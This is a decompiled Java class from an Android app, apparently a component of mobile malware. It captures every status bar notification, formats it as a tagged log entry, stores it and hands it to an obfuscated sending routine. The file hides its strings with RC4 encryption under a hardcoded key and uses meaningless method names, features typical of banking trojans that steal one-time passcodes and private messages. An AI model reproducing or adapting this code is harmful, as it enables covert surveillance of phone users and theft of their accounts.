package com.example.mmm.Utils;

import com.example.mmm.*;
import android.content.*;
import com.example.mmm.API.*;
import android.util.*;
import android.service.notification.*;

public final class LogNotification
{
    constants strings$;
    utils propose$;
    private Context princess$;
    
    LogNotification(final Context princess$) {
        super();
        this.strings$ = new constants();
        this.propose$ = new utils();
        this.princess$ = princess$;
    }
    
    private String _spirits(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    final void _revenue(final StatusBarNotification statusBarNotification) {
        this.sendNotificationLog(new NotificationParser(statusBarNotification, false).toString());
    }
    
    final void sendNotificationLog(String string) {
        final utils utils = new utils();
        final constants constants = new constants();
        final StringBuilder sb = new StringBuilder();
        sb.append("{Notification} ");
        sb.append(string);
        sb.append("[143523#]");
        string = sb.toString();
        utils.Log("sendSMS", string);
        utils.SettingsToAdd(this.princess$, "AS", string);
        utils._compiled(this.princess$, utils.SettingsRead(this.princess$, "QQ"));
    }
}
